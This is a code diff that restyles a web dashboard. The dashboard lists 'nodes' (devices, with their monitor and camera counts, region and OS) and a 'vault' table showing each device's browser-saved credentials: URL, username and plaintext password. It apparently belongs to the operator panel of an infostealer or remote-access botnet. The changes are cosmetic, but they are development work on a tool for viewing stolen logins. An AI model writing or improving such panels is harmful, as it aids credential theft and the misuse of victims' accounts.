@@ -763,10 +763,10 @@ function renderNodes() {
     </div>
 </div>
 <div class="node-media-row">
-    <div class="media-chip">ðŸ–¥ <span style="font-weight:700">${monitors}</span></div>
-    <div class="media-chip">ðŸ“· <span style="font-weight:700">${cameras}</span></div>
+    <div class="media-chip">🖥 <span>${monitors}</span></div>
+    <div class="media-chip">📸 <span>${cameras}</span></div>
     ${flag ? `<div class="media-chip">${flag} <span>${region}</span></div>` : ""}
-    ${canManage ? `<button type="button" class="btn-ghost" style="padding:2px 6px;font-size:0.55rem;margin-left:auto" onclick="event.stopPropagation(); adminToggleNodePublic('${n.id}', ${!isPrivate})">${isPrivate ? "ðŸ”“ MAKE PUBLIC" : "ðŸ”’ MAKE PRIVATE"}</button>` : ""}
+    ${canManage ? `<button type="button" class="btn-ghost" style="padding:4px 8px;font-size:0.58rem;margin-left:auto;border-radius:6px" onclick="event.stopPropagation(); adminToggleNodePublic('${n.id}', ${!isPrivate})">${isPrivate ? "🔓 MAKE PUBLIC" : "🔒 MAKE PRIVATE"}</button>` : ""}
 </div>
 <div class="node-specs-grid">
     <div class="spec-row"><span class="spec-key">OS</span><span class="spec-val">${s.os || "â€”"}</span></div>
@@ -1699,15 +1699,17 @@ function renderVaultData(dataArray) {
 			item.data.forEach(cred => {
 				const _d = new Date(item.ts * 1000).toLocaleString();
 				html += `
-					<tr style="border-bottom:1px solid rgba(255,255,255,0.05)">
-						<td style="padding:.75rem;color:var(--teal)">${item.device_id.substring(0,8)}...</td>
-						<td style="padding:.75rem">Credentials (${cred.browser})</td>
-						<td style="padding:.75rem;color:var(--text-2)">${cred.url || '-'}</td>
-						<td style="padding:.75rem">
-							<div><span style="color:var(--text-3)">U:</span> ${cred.user || '-'}</div>
-							<div><span style="color:var(--text-3)">P:</span> <span style="color:var(--amber)">${cred.pass || '-'}</span></div>
+					<tr style="border-bottom:1px solid var(--border);transition:var(--t-norm);cursor:default" class="vault-row">
+						<td style="padding:1rem;color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:0.65rem">${item.device_id.substring(0,8)}</td>
+						<td style="padding:1rem"><span class="badge badge-teal" style="font-size:0.55rem;padding:2px 6px">CREDENTIALS</span></td>
+						<td style="padding:1rem;color:var(--text-2);max-width:200px;overflow:hidden;text-overflow:ellipsis">${cred.url || '-'}</td>
+						<td style="padding:1rem">
+							<div style="display:flex;flex-direction:column;gap:4px">
+								<div style="display:flex;align-items:center;gap:6px"><span style="font-size:0.55rem;font-weight:800;color:var(--text-3);width:12px">U</span> <span style="color:var(--text-1)">${cred.user || '-'}</span></div>
+								<div style="display:flex;align-items:center;gap:6px"><span style="font-size:0.55rem;font-weight:800;color:var(--text-3);width:12px">P</span> <span style="color:var(--amber);font-weight:700">${cred.pass || '-'}</span></div>
+							</div>
 						</td>
-						<td style="padding:.75rem;color:var(--text-3)">${_d}</td>
+						<td style="padding:1rem;color:var(--text-3);font-size:0.6rem">${_d}</td>
 					</tr>
 				`;
 			});
@@ -1720,12 +1722,12 @@ function renderVaultData(dataArray) {
 		}
 		
 		html += `
-			<tr style="border-bottom:1px solid rgba(255,255,255,0.05)">
-				<td style="padding:.75rem;color:var(--teal)">${item.device_id.substring(0,8)}...</td>
-				<td style="padding:.75rem">${item.type}</td>
-				<td style="padding:.75rem;color:var(--text-2)">${site}</td>
-				<td style="padding:.75rem;color:var(--amber)">${identity}</td>
-				<td style="padding:.75rem;color:var(--text-3)">${d}</td>
+			<tr style="border-bottom:1px solid var(--border);transition:var(--t-norm);cursor:default" class="vault-row">
+				<td style="padding:1rem;color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:0.65rem">${item.device_id.substring(0,8)}</td>
+				<td style="padding:1rem"><span class="badge badge-blue" style="font-size:0.55rem;padding:2px 6px">${item.type.toUpperCase()}</span></td>
+				<td style="padding:1rem;color:var(--text-2)">${site}</td>
+				<td style="padding:1rem;color:var(--amber)">${identity}</td>
+				<td style="padding:1rem;color:var(--text-3);font-size:0.6rem">${d}</td>
 			</tr>
 		`;
 	});
